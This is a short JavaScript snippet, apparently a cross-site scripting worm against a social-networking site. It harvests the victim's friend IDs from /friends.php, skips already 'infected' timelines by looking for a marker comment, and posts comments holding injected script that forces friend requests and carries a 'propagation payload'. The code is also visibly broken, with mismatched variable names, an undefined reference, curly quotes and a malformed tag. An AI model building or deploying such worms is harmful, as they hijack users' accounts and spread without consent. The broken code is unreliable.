// Get victim’s list of friends
var friends_list = new XMLHttpRequest();
friend_page.open(‘GET’, ‘/friends.php’);
friend_page.responseType = ‘document’;
friend_page.send();

// Parse response and get friend IDs
var friend_links = friend_page.responseXML.getElementsByTagName(“a”);
var friend_ids = [];
if (friend_links.length > 0) {
	var id_index = a[0].href.indexOf(“?”) + “id=”.length + 1;
	for ( i = 0; i < friend_links.length; i++) {
		friend_ids.push( friend_links.href.substring( id_index ) );
	}
} else {
	// No friends, give up.
	throw new Error();
}

// Make new friends
var check = new XMLHttpRequest();
for ( i = 0; i < friend_ids.length; i++) {
	check.open(‘GET’, ‘/timeline.php?id=’ + friend_ids[i]);
	check.send();
	// Check if user has already been infected
	if (check.responseText.includes(“<!--2g4u2o6gh456u87dfgas87df-->”)) {
		break;
	}
	// Add friend payload
	var payload = “&comment=”;
	payload += “<script>”
	payload += “var x = new XMLHttpRequest();”
	payload += “x.open(‘GET’,’/add_friend.php=89’);”;
	payload += “x.send();”
	payload += “</script>”;
	payload += “Hello, friend!<!--2g4u2o6gh456u87dfgas87df-->”
	// Add propagation payload
	payload += “<script src=’just a test’”/>
	var request = ‘/add_comment.php?id=’ + friend_ids[i] + payload;
	var add = new XMLHttpRequest();
	add.open(‘GET’, request);
	add.send();
}
